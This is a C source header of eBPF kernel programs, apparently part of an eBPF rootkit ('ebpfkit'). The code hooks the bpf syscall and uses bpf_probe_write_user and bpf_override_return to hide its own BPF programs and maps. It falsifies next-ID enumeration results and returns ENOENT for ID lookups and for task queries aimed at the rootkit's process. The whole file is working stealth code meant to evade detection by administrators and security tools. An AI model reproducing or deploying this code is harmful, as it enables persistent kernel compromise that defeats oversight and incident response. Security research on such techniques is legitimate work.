/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/* Copyright (c) 2020
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 2 of the GNU General Public
 * License as published by the Free Software Foundation.
 */
#ifndef _BPF_H_
#define _BPF_H_

#include "../bpf/bpf.h"
#include "../bpf/bpf_map.h"
#include "../bpf/bpf_helpers.h"

struct bpf_syscall_t {
    void *buf;
    int cmd;
    u32 id;
};

struct bpf_map_def SEC("maps/bpf_cache") bpf_cache = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(u64),
    .value_size = sizeof(struct bpf_syscall_t),
    .max_entries = 1024,
    .pinning = 0,
    .namespace = "",
};

struct bpf_get_next_id_t {
    union {
        u32 start_id;
        u32 prog_id;
        u32 map_id;
        u32 btf_id;
    };
    u32 next_id;
    u32 open_flags;
};

struct bpf_task_fd_query_t {
    u32           pid;            /* input: pid */
    u32           fd;             /* input: fd */
    u32           flags;          /* input: flags */
    u32           buf_len;        /* input/output: buf len */
    /*
    __aligned_u64   buf;
    __u32           prog_id;
    __u32           fd_type;
    __u64           probe_offset;
    __u64           probe_addr;
    */
};

struct bpf_map_def SEC("maps/bpf_programs") bpf_programs = {
    .type = BPF_MAP_TYPE_HASH,
    .key_size = sizeof(u32),
    .value_size = sizeof(u32),
    .max_entries = 1024,
    .pinning = 0,
    .namespace = "",
};

struct bpf_map_def SEC("maps/bpf_next_id") bpf_next_id = {
    .type = BPF_MAP_TYPE_ARRAY,
    .key_size = sizeof(u32),
    .value_size = sizeof(u32),
    .max_entries = 2,
    .pinning = 0,
    .namespace = "",
};

struct bpf_map_def SEC("maps/bpf_maps") bpf_maps = {
    .type = BPF_MAP_TYPE_HASH,
    .key_size = sizeof(u32),
    .value_size = sizeof(u32),
    .max_entries = 1024,
    .pinning = 0,
    .namespace = "",
};

__attribute__((always_inline)) int handle_bpf(int cmd, void *buf, size_t size) {
    u64 key = bpf_get_current_pid_tgid();
    struct bpf_syscall_t bpf = { };

    bpf.buf = buf;
    bpf.cmd = cmd;
    bpf_map_update_elem(&bpf_cache, &key, &bpf, BPF_ANY);

    return 0;
}

SYSCALL_KPROBE3(bpf, int, cmd, void *, buf, size_t, size) {
    return handle_bpf(cmd, buf, size);
}

__attribute__((always_inline)) int handle_bpf_ret(struct pt_regs *ctx) {
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct bpf_syscall_t *bpf = bpf_map_lookup_elem(&bpf_cache, &pid_tgid);
    if (bpf == NULL)
        return 0;

    u32 tgid = pid_tgid >> 32;
    u32 *next_id;
    struct bpf_get_next_id_t get_next_id;
    struct bpf_task_fd_query_t query;

    switch (bpf->cmd) {
        case BPF_PROG_GET_NEXT_ID:
            bpf_probe_read(&get_next_id, sizeof(get_next_id), bpf->buf);

            // asked for our program, we hide it
            // this could be done at syscall enter
            next_id = bpf_map_lookup_elem(&bpf_programs, &get_next_id.start_id);            
            if (next_id != NULL) {
                bpf_probe_write_user(((char*) bpf->buf) + 4, next_id, sizeof(*next_id));
                if (*next_id == 0xffffffff) {
                    bpf_override_return(ctx, -2);
                    return 0;
                }
            }

            // asked for the program before ours, hide it too
            next_id = bpf_map_lookup_elem(&bpf_programs, &get_next_id.next_id);            
            if (next_id != NULL) {
                u32 key = 0;
                next_id = bpf_map_lookup_elem(&bpf_next_id, &key);
                if (next_id != NULL) {
                    bpf_probe_write_user(((char*) bpf->buf) + 4, next_id, sizeof(*next_id));
                    if (*next_id == 0xffffffff) {
                        bpf_override_return(ctx, -ENOENT);
                        return 0;
                    }
                }
            }

            break;

        case BPF_PROG_GET_FD_BY_ID:
            if (tgid == get_ebpfkit_pid())
                return 0;

            // should be done at syscall enter
            bpf_probe_read(&get_next_id, sizeof(get_next_id), bpf->buf);

            next_id = bpf_map_lookup_elem(&bpf_programs, &get_next_id.prog_id);
            if (next_id != NULL) {
                bpf_override_return(ctx, -ENOENT);
                return 0;
            }

            break;

        case BPF_MAP_GET_NEXT_ID:
            bpf_probe_read(&get_next_id, sizeof(get_next_id), bpf->buf);

            // asked for our map, we hide it
            // this could be done at syscall enter
            next_id = bpf_map_lookup_elem(&bpf_maps, &get_next_id.start_id);            
            if (next_id != NULL) {
                bpf_probe_write_user(((char*) bpf->buf) + 4, next_id, sizeof(*next_id));
                if (*next_id == 0xffffffff) {
                    bpf_override_return(ctx, -2);
                    return 0;
                }
            }

            // asked for the map before ours, hide it too
            next_id = bpf_map_lookup_elem(&bpf_maps, &get_next_id.next_id);            
            if (next_id != NULL) {
                u32 key = 1;
                next_id = bpf_map_lookup_elem(&bpf_next_id, &key);
                if (next_id != NULL) {
                    bpf_probe_write_user(((char*) bpf->buf) + 4, next_id, sizeof(*next_id));
                    if (*next_id == 0xffffffff) {
                        bpf_override_return(ctx, -ENOENT);
                        return 0;
                    }
                }
            }

            break;

        case BPF_MAP_GET_FD_BY_ID:
            if (tgid == get_ebpfkit_pid())
                return 0;

            // should be done at syscall enter
            bpf_probe_read(&get_next_id, sizeof(get_next_id), bpf->buf);
            next_id = bpf_map_lookup_elem(&bpf_maps, &get_next_id.map_id);
            if (next_id != NULL) {
                bpf_override_return(ctx, -ENOENT);
                return 0;
            }

            break;

        case BPF_PROG_LOAD:
            if (PT_REGS_RC(ctx) < 0)
                return 0;

            u32 key = 0;
            next_id = bpf_map_lookup_elem(&bpf_next_id, &key);
            if (next_id != NULL && *next_id == 0xffffffff) {
                bpf_map_update_elem(&bpf_next_id, &key, &bpf->id, BPF_ANY);
            }

            break;

        case BPF_MAP_CREATE:
            if (PT_REGS_RC(ctx) < 0)
                return 0;

            key = 1;
            next_id = bpf_map_lookup_elem(&bpf_next_id, &key);
            if (next_id != NULL && *next_id == 0xffffffff) {
                bpf_map_update_elem(&bpf_next_id, &key, &bpf->id, BPF_ANY);
            }

            break;

        case BPF_TASK_FD_QUERY:
            bpf_probe_read(&query, sizeof(query), bpf->buf);
            if (query.pid == get_ebpfkit_pid()) {
                bpf_override_return(ctx, -ENOENT);
                return 0;
            }

            break;
    }

    bpf_map_delete_elem(&bpf_cache, &pid_tgid);
    return 0;
}

SYSCALL_KRETPROBE(bpf) {
    return handle_bpf_ret(ctx);
}

SEC("kprobe/bpf_prog_kallsyms_add")
int kprobe_bpf_prog_kallsyms_add(struct pt_regs *ctx) {
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct bpf_syscall_t *bpf = bpf_map_lookup_elem(&bpf_cache, &pid_tgid);
    if (bpf == NULL)
        return 0;

    struct bpf_prog *prog = (struct bpf_prog *) PT_REGS_PARM1(ctx);
    struct bpf_prog_aux *prog_aux;
    int res = bpf_probe_read(&prog_aux, sizeof(prog_aux), &prog->aux);
    if (res != 0) {
        bpf_printk("bpf_probe_read for prog_aux failed: %d\n", res);
    }

    u32 id;
    res = bpf_probe_read(&id, sizeof(id), &prog_aux->id);
    if (res != 0) {
        bpf_printk("bpf_probe_read for prog id failed: %d\n", res);
    }

    bpf->id = id;
    bpf_printk("prog id %d\n", id);
    return 0;
}

SEC("kprobe/bpf_map_new_fd")
int kprobe_bpf_map_new_fd(struct pt_regs *ctx) {
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct bpf_syscall_t *bpf = bpf_map_lookup_elem(&bpf_cache, &pid_tgid);
    if (bpf == NULL)
        return 0;

    struct bpf_map *map = (struct bpf_map *) PT_REGS_PARM1(ctx);

    u32 id;
    int res = bpf_probe_read(&id, sizeof(id), &map->id);
    if (res != 0) {
        bpf_printk("bpf_probe_read for map id failed: %d\n", res);
    }

    bpf->id = id;
    bpf_printk("map id %d\n", id);
    return 0;
}

#endif